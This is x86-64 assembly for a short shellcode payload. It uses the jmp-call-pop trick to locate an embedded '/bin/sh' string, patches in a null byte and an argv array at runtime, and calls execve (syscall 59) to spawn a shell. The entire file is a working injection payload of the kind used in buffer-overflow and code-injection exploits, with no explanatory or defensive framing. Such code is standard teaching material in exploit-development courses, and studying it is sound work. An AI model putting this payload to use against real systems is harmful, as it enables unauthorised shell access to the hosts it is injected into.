global _start

section .text

        jmp get_string

_start:
        pop rdi
        xor rax, rax

        mov [rdi + 7], byte al

        mov [rdi + 8], rdi

        mov [rdi + 16], rax

        lea rsi, [rdi + 8]
        lea rdx, [rdi + 16]

        add rax, 59 ; 59 = execve()

        syscall
        
get_string:
        call _start
string: db "/bin/shABBBBBBBBCCCCCCCC"
